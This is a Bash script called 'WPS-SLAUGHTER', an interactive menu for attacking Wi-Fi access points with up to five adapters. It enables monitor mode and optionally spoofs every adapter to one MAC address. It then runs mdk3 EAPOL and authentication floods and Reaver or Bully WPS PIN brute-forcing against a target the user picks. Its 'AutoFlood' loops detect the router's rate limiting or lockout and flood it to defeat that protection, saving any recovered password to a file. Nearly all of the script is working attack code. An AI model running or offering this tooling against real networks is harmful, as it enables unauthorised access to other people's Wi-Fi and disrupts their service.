#!/bin/bash
clear
declare BSSID;
declare ESSID;
declare CHANNEL;
declare ADAPTER1;
declare ADAPTER2;
declare ADAPTER3;
declare ADAPTER4;
declare ADAPTER5;

echo "
██╗    ██╗██████╗ ███████╗      ███████╗██╗      █████╗ ██╗   ██╗ ██████╗ ██╗  ██╗████████╗███████╗██████╗ 
██║    ██║██╔══██╗██╔════╝      ██╔════╝██║     ██╔══██╗██║   ██║██╔════╝ ██║  ██║╚══██╔══╝██╔════╝██╔══██╗
██║ █╗ ██║██████╔╝███████╗█████╗███████╗██║     ███████║██║   ██║██║  ███╗███████║   ██║   █████╗  ██████╔╝
██║███╗██║██╔═══╝ ╚════██║╚════╝╚════██║██║     ██╔══██║██║   ██║██║   ██║██╔══██║   ██║   ██╔══╝  ██╔══██╗
╚███╔███╔╝██║     ███████║      ███████║███████╗██║  ██║╚██████╔╝╚██████╔╝██║  ██║   ██║   ███████╗██║  ██║
╚══╝╚══╝ ╚═╝     ╚══════╝      ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝

"

echo "WPS-SLAUGHTER BY: Apathetic Euphoria"
echo "+ Help and Support from Aanarchyy"

sleep 3
clear

sudo rfkill unblock all

################################## Functions For MDK3 ########################################

run_mdk3_ASOC1()
{
	xterm -e "timeout 60 mdk3 $ADAPTER1 a -a $BSSID -m"
}

run_mdk3_EAPOL1()
{
	xterm -e "timeout 20s mdk3 $ADAPTER1 x 0 -t $BSSID -n $ESSID -s 250"
}

run_mdk3_ASOC2()
{
	xterm -e "timeout 60 mdk3 $ADAPTER1 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER2 a -a $BSSID -m"
}

run_mdk3_EAPOL2()
{
	xterm -e "timeout 20s mdk3 $ADAPTER1 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER2 x 0 -t $BSSID -n $ESSID -s 250"
}

run_mdk3_ASOC3()
{
	xterm -e "timeout 60 mdk3 $ADAPTER1 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER2 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER3 a -a $BSSID -m"
}

run_mdk3_EAPOL3()
{
	xterm -e "timeout 20s mdk3 $ADAPTER1 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER2 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER3 x 0 -t $BSSID -n $ESSID -s 250"
}

run_mdk3_ASOC4()
{
	xterm -e "timeout 60 mdk3 $ADAPTER1 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER2 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER3 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER4 a -a $BSSID -m"
}

run_mdk3_EAPOL4()
{
	xterm -e "timeout 20s mdk3 $ADAPTER1 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER2 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER3 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER4 x 0 -t $BSSID -n $ESSID -s 250"
}

run_mdk3_ASOC5()
{
	xterm -e "timeout 60 mdk3 $ADAPTER1 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER2 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER3 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER4 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER5 a -a $BSSID -m"
}

run_mdk3_EAPOL5()
{
	xterm -e "timeout 20s mdk3 $ADAPTER1 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER2 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER3 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER4 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER5 x 0 -t $BSSID -n $ESSID -s 250"
}

##################################End Of Functions For MDK3 ########################################


echo "************** - How Many Wlan Adapters Would You Like To Use? - ************** 
1)1 Adapter
2)2 Adapters
3)3 Adapters
4)4 Adapters
5)5 Adapters"

read a
case $a in
	1)
clear

echo 
read -p " - What is the name of your Wlan Adapter (Ex:Wlan0) - ": ADAPTER1;

clear

echo "Enabling Monitor Mode"
sudo ifconfig $ADAPTER1 down
sleep 3
sudo iwconfig $ADAPTER1 mode monitor
sleep 3
sudo ifconfig $ADAPTER1 up
echo "Monitor Mode Enabled"

sleep 1

clear

echo "************** - Would you like to Change the Wlan Adapter's MAC Address? - ************** 
1)Yes
2)No"

read c
case $c in
	1)
clear

echo "Setting the MAC Address"
sudo ifconfig $ADAPTER1 down
sleep 3
macchanger $ADAPTER1 -m 02:22:88:29:EC:6F
sleep 3
sudo ifconfig $ADAPTER1 up
echo "MAC Changed"

sleep 1

clear
;;
	2)
;;
	*)Invalid Option
;;
esac

xterm -e "wash -i $ADAPTER1"

echo 
clear
read -p " - What is the BSSID(MAC) of the Target - ": BSSID;
clear
echo 
read -p " - What is the ESSID(Ap Name) of the Target - ": ESSID;
clear
echo 
read -p " - What is the CHANNEL # of the Target - ": CHANNEL;

clear
pkill wash
menu () {
clear
echo "************** - Which Attack Would You Like To Use? - ************** 
1)EAPOL Start Flood 
2)Authentication Flood
3)Reaver
4)Check if Access Point WPS is UNLOCKED
5)Reaver with AutoFlood(ASOC)
6)Reaver with AutoFlood(EAPOL)
7)Bully
8)Bully with AutoFlood(ASOC)
9)Bully with AutoFlood(EAPOL)

*AutoFlood Attacks will store the Password in Root/(Reaver or Bully)Output.txt Once found*"

read d
case $d in
	1)
clear
timeout 20s mdk3 $ADAPTER1 x 0 -t $BSSID -n $ESSID -s 250
menu
;;
	2)
clear
timeout 60 mdk3 $ADAPTER1 a -a $BSSID -m
menu
;;
	3)
clear
reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv | tee ~TmpReaverOutput.txt 
DETECT_RATE_LIMITING= tail -n 1 ~TmpReaverOutput.txt
while [ "$DETECT_RATE_LIMITING" = "[!] WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking" ]; do
gnome-terminal  --geometry=1x2 --title='Flood Attack in Progess' -e "timeout 20s mdk3 $ADAPTER1 x 0 -t $BSSID -n $ESSID -s 250"
done
menu
;;
	4)
clear
xterm -e "wash -i $ADAPTER1"
menu
;;
	5)
clear
reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv | tee ReaverOutput.txt &
reaver_pid=$! 

while kill -0 $reaver_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' ReaverOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"limiting"* ]]; then
	run_mdk3_ASOC1
    fi
    sleep 1
done
menu
;;
	6)
clear
reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv | tee ReaverOutput.txt &
reaver_pid=$! 

while kill -0 $reaver_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' ReaverOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"limiting"* ]]; then
	run_mdk3_EAPOL1
    fi
    sleep 1
done
menu
;;
	7)
clear
bully -b $BSSID -c $CHANNEL $ADAPTER1
menu
;;
	8)
clear
bully -b $BSSID -c $CHANNEL $ADAPTER1 | tee BullyOutput.txt &
bully_pid=$! 

while kill -0 $bully_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' BullyOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"lockout"* ]]; then
	run_mdk3_ASOC1
    fi
    sleep 1
done
menu
;;
	9)
clear
bully -b $BSSID -c $CHANNEL $ADAPTER1 | tee BullyOutput.txt &
bully_pid=$! 

while kill -0 $bully_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' BullyOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"lockout"* ]]; then
	run_mdk3_EAPOL1
    fi
    sleep 1
done
menu
;;
	*)Invalid Option
menu
;;
esac
}

menu

;;
	2)
clear

echo 
read -p " - What is the name of your 1st Wlan Adapter (Ex:Wlan0) - ": ADAPTER1;
clear
echo 
read -p " - What is the name of your 2nd Wlan Adapter (Ex:Wlan1) - ": ADAPTER2;
clear
echo "Enabling Monitor Mode"
sudo ifconfig $ADAPTER1 down
sleep 3
sudo iwconfig $ADAPTER1 mode monitor
sleep 3
sudo ifconfig $ADAPTER1 up
sudo ifconfig $ADAPTER2 down
sleep 3
sudo iwconfig $ADAPTER2 mode monitor
sleep 3
sudo ifconfig $ADAPTER2 up
echo "Monitor Mode Enabled"
sleep 1
clear

echo "************** - Would you like to set the 2 Adapters to an Identical MAC Address? - ************** 
1)Yes
2)No"

read f
case $f in
	1)
clear
echo "Setting the MAC Address"
sudo ifconfig $ADAPTER1 down
sleep 3
macchanger $ADAPTER1 -m 02:22:88:29:EC:6F
sleep 3
sudo ifconfig $ADAPTER1 up
sudo ifconfig $ADAPTER2 down
sleep 3
macchanger $ADAPTER2 -m 02:22:88:29:EC:6F
sleep 3
sudo ifconfig $ADAPTER2 up
echo "MACs Changed"
sleep 1
clear
;;
	2)
;;
	*)Invalid Option
;;
esac



xterm -e "wash -i $ADAPTER1"

echo 
clear
read -p " - What is the BSSID(MAC) of the Target - ": BSSID;
clear
echo 
read -p " - What is the ESSID(Ap Name) of the Target - ": ESSID;
clear
echo 
read -p " - What is the CHANNEL # of the Target - ": CHANNEL;
clear
pkill wash
menu () {
clear
echo "************** - Which Attack Would You Like To Use? - ************** 
1)EAPOL Start Flood 
2)Authentication Flood
3)Reaver
4)Check if Access Point WPS is UNLOCKED
5)Reaver with AutoFlood(ASOC)
6)Reaver with AutoFlood(EAPOL)
7)Bully
8)Bully with AutoFlood(ASOC)
9)Bully with AutoFlood(EAPOL)

*AutoFlood Attacks will store the Password in Root/(Reaver or Bully)Output.txt Once found*"

read g
case $g in
	1)
clear
timeout 20s mdk3 $ADAPTER1 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER2 x 0 -t $BSSID -n $ESSID -s 250
menu
;;
	2)
clear
timeout 60 mdk3 $ADAPTER1 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER2 a -a $BSSID -m
menu
;;
	3)
clear
reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv
menu
;;
	4)
clear
xterm -e "wash -i $ADAPTER1"
menu
;;
	5)
clear
reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv | tee ReaverOutput.txt &
reaver_pid=$! 

while kill -0 $reaver_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' ReaverOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"limiting"* ]]; then
	run_mdk3_ASOC2
    fi
    sleep 1
done
menu
;;
	6)
clear
reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv | tee ReaverOutput.txt &
reaver_pid=$! 

while kill -0 $reaver_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' ReaverOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"limiting"* ]]; then
	run_mdk3_EAPOL2
    fi
    sleep 1
done
menu
;;
	7)
clear
bully -b $BSSID -c $CHANNEL $ADAPTER1
menu
;;
	8)
clear
bully -b $BSSID -c $CHANNEL $ADAPTER1 | tee BullyOutput.txt &
bully_pid=$! 

while kill -0 $bully_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' BullyOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"lockout"* ]]; then
	run_mdk3_ASOC2
    fi
    sleep 1
done
menu
;;
	9)
clear
bully -b $BSSID -c $CHANNEL $ADAPTER1 | tee BullyOutput.txt &
bully_pid=$! 

while kill -0 $bully_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' BullyOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"lockout"* ]]; then
	run_mdk3_EAPOL2
    fi
    sleep 1
done
menu
;;
	*)Invalid Option
menu
;;
esac

}

menu

;;
	3)
clear
echo 
read -p " - What is the name of your 1st Wlan Adapter (Ex:Wlan0) - ": ADAPTER1;
clear
echo 
read -p " - What is the name of your 2nd Wlan Adapter (Ex:Wlan1) - ": ADAPTER2;
clear
echo 
read -p " - What is the name of your 3rd Wlan Adapter (Ex:Wlan2) - ": ADAPTER3;
clear

echo "Enabling Monitor Mode"
sudo ifconfig $ADAPTER1 down
sleep 3
sudo iwconfig $ADAPTER1 mode monitor
sleep 3
sudo ifconfig $ADAPTER1 up
sudo ifconfig $ADAPTER2 down
sleep 3
sudo iwconfig $ADAPTER2 mode monitor
sleep 3
sudo ifconfig $ADAPTER2 up
sudo ifconfig $ADAPTER3 down
sleep 3
sudo iwconfig $ADAPTER3 mode monitor
sleep 3
sudo ifconfig $ADAPTER3 up
echo "Monitor Mode Enabled"
sleep 1
clear

echo "************** - Would you like to set the 3 Adapters to an Identical MAC Address? - ************** 
1)Yes
2)No"

read i
case $i in
	1)
clear
echo "Setting the MAC Address"
sudo ifconfig $ADAPTER1 down
sleep 3
macchanger $ADAPTER1 -m 02:22:88:29:EC:6F
sleep 3
sudo ifconfig $ADAPTER1 up
sudo ifconfig $ADAPTER2 down
sleep 3
macchanger $ADAPTER2 -m 02:22:88:29:EC:6F
sleep 3
sudo ifconfig $ADAPTER2 up
sudo ifconfig $ADAPTER3 down
sleep 3
macchanger $ADAPTER3 -m 02:22:88:29:EC:6F
sleep 3
sudo ifconfig $ADAPTER3 up
echo "MACs Changed"
sleep 1
clear
;;
	2)
;;
	*)Invalid Option
;;
esac

xterm -e "wash -i $ADAPTER1"

echo 
read -p " - What is the BSSID(MAC) of the Target - ": BSSID;
clear
echo 
read -p " - What is the ESSID(Ap Name) of the Target - ": ESSID;
clear
echo 
read -p " - What is the CHANNEL # of the Target - ": CHANNEL;

clear
pkill wash
menu () {
clear
echo "************** - Which Attack Would You Like To Use? - ************** 
1)EAPOL Start Flood 
2)Authentication Flood
3)Reaver
4)Check if Access Point WPS is UNLOCKED
5)Reaver with AutoFlood(ASOC)
6)Reaver with AutoFlood(EAPOL)
7)Bully
8)Bully with AutoFlood(ASOC)
9)Bully with AutoFlood(EAPOL)

*AutoFlood Attacks will store the Password in Root/(Reaver or Bully)Output.txt Once found*"

read j
case $j in
	1)
clear
timeout 20s mdk3 $ADAPTER1 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER2 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER3 x 0 -t $BSSID -n $ESSID -s 250
menu
;;
	2)
clear
timeout 60 mdk3 $ADAPTER1 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER2 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER3 a -a $BSSID -m
menu
;;
	3)
clear
reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv
menu
;;
	4)
clear
xterm -e "wash -i $ADAPTER1"
menu
;;
	5)
clear
reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv | tee ReaverOutput.txt &
reaver_pid=$! 

while kill -0 $reaver_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' ReaverOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"limiting"* ]]; then
	run_mdk3_ASOC3
    fi
    sleep 1
done
menu
;;
	6)
clear
reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv | tee ReaverOutput.txt &
reaver_pid=$! 

while kill -0 $reaver_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' ReaverOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"limiting"* ]]; then
	run_mdk3_EAPOL3
    fi
    sleep 1
done
menu
;;
	7)
clear
bully -b $BSSID -c $CHANNEL $ADAPTER1
menu
;;
	8)
clear
bully -b $BSSID -c $CHANNEL $ADAPTER1 | tee BullyOutput.txt &
bully_pid=$! 

while kill -0 $bully_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' BullyOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"lockout"* ]]; then
	run_mdk3_ASOC3
    fi
    sleep 1
done
menu
;;
	9)
clear
bully -b $BSSID -c $CHANNEL $ADAPTER1 | tee BullyOutput.txt &
bully_pid=$! 

while kill -0 $bully_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' BullyOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"lockout"* ]]; then
	run_mdk3_EAPOL3
    fi
    sleep 1
done
menu
;;
	*)Invalid Option
menu
;;
esac
}

menu

;;
	4)
clear
echo 
read -p " - What is the name of your 1st Wlan Adapter (Ex:Wlan0) - ": ADAPTER1;
clear
echo 
read -p " - What is the name of your 2nd Wlan Adapter (Ex:Wlan1) - ": ADAPTER2;
clear
echo 
read -p " - What is the name of your 3rd Wlan Adapter (Ex:Wlan2) - ": ADAPTER3;
clear
echo 
read -p " - What is the name of your 4th Wlan Adapter (Ex:Wlan3) - ": ADAPTER4;
clear

echo "Enabling Monitor Mode"
sudo ifconfig $ADAPTER1 down
sleep 3
sudo iwconfig $ADAPTER1 mode monitor
sleep 3
sudo ifconfig $ADAPTER1 up
sudo ifconfig $ADAPTER2 down
sleep 3
sudo iwconfig $ADAPTER2 mode monitor
sleep 3
sudo ifconfig $ADAPTER2 up
sudo ifconfig $ADAPTER3 down
sleep 3
sudo iwconfig $ADAPTER3 mode monitor
sleep 3
sudo ifconfig $ADAPTER3 up
sudo ifconfig $ADAPTER4 down
sleep 3
sudo iwconfig $ADAPTER4 mode monitor
sleep 3
sudo ifconfig $ADAPTER4 up
echo "Monitor Mode Enabled"
sleep 1
clear

echo "************** - Would you like to set ALL Wlan Adapters to the same MAC Address? - ************** 
1)Yes
2)No"

read l
case $l in
	1)
clear
echo "Setting All Wlan MAC Addresses to Identical MAC"
sudo ifconfig $ADAPTER1 down
sleep 3
macchanger $ADAPTER1 -m 02:22:88:29:EC:6F
sleep 3
sudo ifconfig $ADAPTER1 up
sudo ifconfig $ADAPTER2 down
sleep 3
macchanger $ADAPTER2 -m 02:22:88:29:EC:6F
sleep 3
sudo ifconfig $ADAPTER2 up
sudo ifconfig $ADAPTER3 down
sleep 3
macchanger $ADAPTER3 -m 02:22:88:29:EC:6F
sleep 3
sudo ifconfig $ADAPTER3 up
sudo ifconfig $ADAPTER4 down
sleep 3
macchanger $ADAPTER4 -m 02:22:88:29:EC:6F
sleep 3
sudo ifconfig $ADAPTER4 up
echo "MACs Changed"
sleep 1
clear
;;
	2)
;;
	*)Invalid Option
;;
esac

clear
xterm -e "wash -i $ADAPTER1"

echo 
read -p " - What is the BSSID(MAC) of the Target - ": BSSID;
clear
echo 
read -p " - What is the ESSID(Ap Name) of the Target - ": ESSID;
clear
echo 
read -p " - What is the CHANNEL # of the Target - ": CHANNEL;
clear
pkill wash
menu () {
clear
echo "************** - Which Attack Would You Like To Use? - ************** 
1)EAPOL Start Flood 
2)Authentication Flood
3)Reaver
4)Check if Access Point WPS is UNLOCKED
5)Reaver with AutoFlood(ASOC)
6)Reaver with AutoFlood(EAPOL)
7)Bully
8)Bully with AutoFlood(ASOC)
9)Bully with AutoFlood(EAPOL)

*AutoFlood Attacks will store the Password in Root/(Reaver or Bully)Output.txt Once found*"

read m
case $m in
	1)
clear
timeout 20s mdk3 $ADAPTER1 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER2 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER3 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER4 x 0 -t $BSSID -n $ESSID -s 250
menu
;;
	2)
clear
timeout 60 mdk3 $ADAPTER1 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER2 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER3 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER4 a -a $BSSID -m
menu
;;
	3)
clear
reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv
menu
;;
	4)
clear
xterm -e "wash -i $ADAPTER1"
menu
;;
	5)
clear
reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv | tee ReaverOutput.txt &
reaver_pid=$! 

while kill -0 $reaver_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' ReaverOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"limiting"* ]]; then
	run_mdk3_ASOC4
    fi
    sleep 1
done
menu
;;
	6)
clear
reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv | tee ReaverOutput.txt &
reaver_pid=$! 

while kill -0 $reaver_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' ReaverOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"limiting"* ]]; then
	run_mdk3_EAPOL4
    fi
    sleep 1
done
menu
;;
	7)
clear
bully -b $BSSID -c $CHANNEL $ADAPTER1
menu
;;
	8)
clear
bully -b $BSSID -c $CHANNEL $ADAPTER1 | tee BullyOutput.txt &
bully_pid=$! 

while kill -0 $bully_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' BullyOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"lockout"* ]]; then
	run_mdk3_ASOC4
    fi
    sleep 1
done
menu
;;
	9)
clear
bully -b $BSSID -c $CHANNEL $ADAPTER1 | tee BullyOutput.txt &
bully_pid=$! 

while kill -0 $bully_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' BullyOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"lockout"* ]]; then
	run_mdk3_EAPOL4
    fi
    sleep 1
done
menu
;;
	*)Invalid Option
menu
;;
esac
}

menu

;;
	5)
clear
echo 
read -p " - What is the name of your 1st Wlan Adapter (Ex:Wlan0) - ": ADAPTER1;
clear
echo 
read -p " - What is the name of your 2nd Wlan Adapter (Ex:Wlan1) - ": ADAPTER2;
clear
echo 
read -p " - What is the name of your 3rd Wlan Adapter (Ex:Wlan2) - ": ADAPTER3;
clear
echo 
read -p " - What is the name of your 4th Wlan Adapter (Ex:Wlan3) - ": ADAPTER4;
clear
echo 
read -p " - What is the name of your 5th Wlan Adapter (Ex:Wlan4) - ": ADAPTER5;
clear
echo "Enabling Monitor Mode"
sudo ifconfig $ADAPTER1 down
sleep 3
sudo iwconfig $ADAPTER1 mode monitor
sleep 3
sudo ifconfig $ADAPTER1 up
sudo ifconfig $ADAPTER2 down
sleep 3
sudo iwconfig $ADAPTER2 mode monitor
sleep 3
sudo ifconfig $ADAPTER2 up
sudo ifconfig $ADAPTER3 down
sleep 3
sudo iwconfig $ADAPTER3 mode monitor
sleep 3
sudo ifconfig $ADAPTER3 up
sudo ifconfig $ADAPTER4 down
sleep 3
sudo iwconfig $ADAPTER4 mode monitor
sleep 3
sudo ifconfig $ADAPTER4 up
sudo ifconfig $ADAPTER5 down
sleep 3
sudo iwconfig $ADAPTER5 mode monitor
sleep 3
sudo ifconfig $ADAPTER5 up
echo "Monitor Mode Enabled"
sleep 1
clear

echo "************** - Would you like to set ALL Wlan Adapters to the same MAC Address? - ************** 
1)Yes
2)No"

read o
case $o in
	1)
clear
echo "Setting All Wlan MAC Addresses to Identical MAC"
sudo ifconfig $ADAPTER1 down
sleep 3
macchanger $ADAPTER1 -m 02:22:88:29:EC:6F
sleep 3
sudo ifconfig $ADAPTER1 up
sudo ifconfig $ADAPTER2 down
sleep 3
macchanger $ADAPTER2 -m 02:22:88:29:EC:6F
sleep 3
sudo ifconfig $ADAPTER2 up
sudo ifconfig $ADAPTER3 down
sleep 3
macchanger $ADAPTER3 -m 02:22:88:29:EC:6F
sleep 3
sudo ifconfig $ADAPTER3 up
sudo ifconfig $ADAPTER4 down
sleep 3
macchanger $ADAPTER4 -m 02:22:88:29:EC:6F
sleep 3
sudo ifconfig $ADAPTER4 up
sudo ifconfig $ADAPTER5 down
sleep 3
macchanger $ADAPTER5 -m 02:22:88:29:EC:6F
sleep 3
sudo ifconfig $ADAPTER5 up
echo "MACs Changed"
sleep 1
clear
;;
	2)
;;
	*)Invalid Option
;;
esac


xterm -e "wash -i $ADAPTER1"
clear
echo 
read -p " - What is the BSSID(MAC) of the Target - ": BSSID;
clear
echo 
read -p " - What is the ESSID(Ap Name) of the Target - ": ESSID;
clear
echo 
read -p " - What is the CHANNEL # of the Target - ": CHANNEL;

clear
pkill wash
menu () {
clear
echo "************** - Which Attack Would You Like To Use? - ************** 
1)EAPOL Start Flood 
2)Authentication Flood
3)Reaver
4)Check if Access Point WPS is UNLOCKED
5)Reaver with AutoFlood(ASOC)
6)Reaver with AutoFlood(EAPOL)
7)Bully
8)Bully with AutoFlood(ASOC)
9)Bully with AutoFlood(EAPOL)

*AutoFlood Attacks will store the Password in Root/(Reaver or Bully)Output.txt Once found*"

read p
case $p in
	1)
clear
timeout 20s mdk3 $ADAPTER1 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER2 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER3 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER4 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER5 x 0 -t $BSSID -n $ESSID -s 250
menu
;;
	2)
clear
timeout 60 mdk3 $ADAPTER1 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER2 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER3 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER4 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER5 a -a $BSSID -m
menu
;;
	3)
clear
reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv
menu
;;
	4)
clear
xterm -e "wash -i $ADAPTER1"
menu
;;
	5)
clear
reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv | tee ReaverOutput.txt &
reaver_pid=$! 

while kill -0 $reaver_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' ReaverOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"limiting"* ]]; then
	run_mdk3_ASOC5
    fi
    sleep 1
done
menu
;;
	6)
clear
reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv | tee ReaverOutput.txt &
reaver_pid=$! 

while kill -0 $reaver_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' ReaverOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"limiting"* ]]; then
	run_mdk3_EAPOL5
    fi
    sleep 1
done
menu
;;
	7)
clear
bully -b $BSSID -c $CHANNEL $ADAPTER1
menu
;;
	8)
clear
bully -b $BSSID -c $CHANNEL $ADAPTER1 | tee BullyOutput.txt &
bully_pid=$! 

while kill -0 $bully_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' BullyOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"lockout"* ]]; then
	run_mdk3_ASOC5
    fi
    sleep 1
done
menu
;;
	9)
clear
bully -b $BSSID -c $CHANNEL $ADAPTER1 | tee BullyOutput.txt &
bully_pid=$! 

while kill -0 $bully_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' BullyOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"lockout"* ]]; then
	run_mdk3_EAPOL5
    fi
    sleep 1
done
menu
;;
	*)Invalid Option
menu
;;
esac
}

menu

;;

esac
